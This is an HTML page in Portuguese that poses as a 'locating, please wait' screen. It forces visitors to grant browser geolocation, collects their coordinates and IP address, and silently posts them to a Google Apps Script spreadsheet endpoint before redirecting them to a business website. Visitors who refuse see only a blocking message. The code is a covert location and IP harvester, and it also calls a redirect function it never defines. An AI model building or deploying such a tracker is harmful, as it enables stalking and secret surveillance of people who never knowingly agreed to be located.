<!DOCTYPE html>
<html lang="pt">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Localizando...</title>
  <style>
    body {
      background-color: #000;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      font-family: Arial, sans-serif;
      text-align: center;
    }
  </style>
  <script>
    window.onload = function() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sucesso, erro);
      } else {
        document.body.innerHTML = "<p>Seu navegador n√£o suporta geolocaliza√ß√£o.</p>";
      }
    };

    function sucesso(position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;

      // Captura o IP do visitante
      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          const ip = data.ip;

          // Note: O link original estava incorreto (googleusercontent.com/maps.google.com/0latitude...). Ajustado para um formato de link de Google Maps.
          const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;

          // Envia os dados para sua planilha no Google Sheets
          fetch('https://script.google.com/macros/s/AKfycbyzRAza0aUzlqUYhuTozf8IrDD4G4OLQGMkgR_CB7gTRa2cNPXHL-0rcSVsj1A6jDKi/exec', {
            method: 'POST',
            mode: 'no-cors',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({
              latitude: latitude,
              longitude: longitude,
              ip: ip,
              maps: mapsLink
            })
          })
          .then(() => { // Garante que o redirecionamento s√≥ aconte√ßa ap√≥s a tentativa de envio
            redirecionaDespachanteMauro();
          })
          .catch(error => {
            console.error("Erro ao enviar dados para o Google Sheets:", error);
            // Mesmo com erro no envio, podemos redirecionar se a localiza√ß√£o foi obtida.
            // Se voc√™ quiser que o redirecionamento S√ì aconte√ßa se o envio for bem-sucedido, remova o redirecionamento daqui e o coloque apenas no .then() acima.
            redirecionaDespachanteMauro(); // Mantido para o redirecionamento ap√≥s a localiza√ß√£o bem-sucedida, mesmo que o envio falhe.
          });
        })
        .catch(error => {
          console.error("Erro ao obter IP:", error);
          // Se n√£o conseguir o IP, ainda podemos tentar redirecionar se a localiza√ß√£o foi obtida.
          redirecionaDespachanteMauro();
        });
    }

    function erro(err) {
      console.warn("Geolocaliza√ß√£o n√£o permitida ou erro:", err);
      // Aqui a p√°gina simplesmente exibe a mensagem e para.
      // O usu√°rio √© "obrigado" a permitir para que o sucesso() seja chamado.
      document.body.innerHTML = "<p>‚ö†Ô∏è √â necess√°rio permitir a localiza√ß√£o para continuar.</p>";
    }

    function redirecionaInstagram() {
      window.location.href = "https://despachantemauro.com.br/";
    }
  </script>
</head>
<body>
  <p>üìç Obtendo sua localiza√ß√£o... Aguarde...</p>
</body>
</html>
